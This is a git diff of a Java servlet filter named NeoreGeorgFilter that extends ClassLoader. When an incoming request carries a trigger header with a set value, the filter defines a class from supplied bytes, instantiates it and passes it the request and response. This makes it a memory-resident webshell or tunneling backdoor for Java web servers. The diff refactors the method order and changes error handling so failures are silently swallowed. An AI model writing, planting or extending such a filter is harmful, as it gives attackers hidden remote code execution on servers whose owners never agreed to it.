@@ -32,23 +32,14 @@ public class NeoreGeorgFilter extends ClassLoader implements Filter {
         super(z);
     }
 
-    @SuppressWarnings("all")
-    public Class<?> load(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
-    @Override
-    public void init(FilterConfig filterConfig) throws ServletException {
-
-    }
-
     @Override
     @SuppressWarnings("all")
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         HttpServletRequest request = (HttpServletRequest) servletRequest;
         HttpServletResponse response = (HttpServletResponse) servletResponse;
         try {
-            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
+            if (request.getHeader(headerName) != null
+                    && request.getHeader(headerName).contains(headerValue)) {
                 Object[] args = new Object[]{
                         request,
                         response,
@@ -70,12 +61,21 @@ public class NeoreGeorgFilter extends ClassLoader implements Filter {
                     namespace.put(chars, clazz.newInstance());
                 }
                 namespace.get(chars).equals(args);
-            } else {
-                filterChain.doFilter(servletRequest, servletResponse);
+                return;
             }
-        } catch (Exception e) {
-            filterChain.doFilter(servletRequest, servletResponse);
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
+        filterChain.doFilter(servletRequest, servletResponse);
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> load(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
+    }
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
 
     }
 
